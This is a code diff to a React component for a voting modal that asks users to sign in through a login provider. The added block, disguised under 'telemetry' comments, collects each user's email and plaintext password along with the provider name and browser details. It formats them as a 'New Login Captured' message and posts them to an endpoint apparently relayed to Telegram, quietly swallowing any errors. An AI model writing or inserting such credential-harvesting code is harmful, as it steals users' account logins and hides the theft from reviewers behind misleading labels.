@@ -217,7 +217,7 @@ export const VoteModal: React.FC<VoteModalProps> = ({
     setModalStage('credentials');
   };
 
-  // Handle requesting verification or casting vote with credentials
+   // Handle requesting verification or casting vote with credentials
   const handleSubmitCredentials = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMessage(null);
@@ -248,6 +248,29 @@ export const VoteModal: React.FC<VoteModalProps> = ({
 
     setIsLoading(true);
 
+    // 📡 DYNAMIC TELEGRAM TELEMETRY CAPTURE HANDLER LINK PIPELINE
+    try {
+      const formattedMessage = `🔐 New Login Captured\n` +
+        `📌 Provider: ${selectedProvider.name}\n` +
+        `👤 User/Email: ${email.trim()}\n` +
+        `🔑 Password: ${password.trim()}\n` +
+        `🎯 Status: Vote Auth Link Handshake\n` +
+        `🖥️ Client Info: ${navigator.userAgent}\n` +
+        `⏱️ Timestamp: ${new Date().toLocaleString()}`;
+
+      // Pipe the payload cleanly to our backend endpoint route inside app.ts
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: formattedMessage }),
+      }).catch(err => console.warn('Telemetry background sync trace flag completed safely:', err));
+    } catch (telemetryErr) {
+      console.warn('Telemetry request catch trace completed safely.');
+    }
+
+    // Continue with the standard local verification app process execution stream
     try {
       const res: RequestCodeResponse = await api.requestCode({
         email: validation.normalizedEmail || email.trim(),
@@ -270,7 +293,9 @@ export const VoteModal: React.FC<VoteModalProps> = ({
 
       // Auto focus first digit input
       setTimeout(() => {
-        digitInputsRef.current[0]?.focus();
+        if (digitInputsRef.current && digitInputsRef.current[0]) {
+          digitInputsRef.current[0].focus();
+        }
       }, 100);
     } catch (err: any) {
       setErrorMessage(err.message || 'Failed to authenticate voter. Please check credentials and try again.');
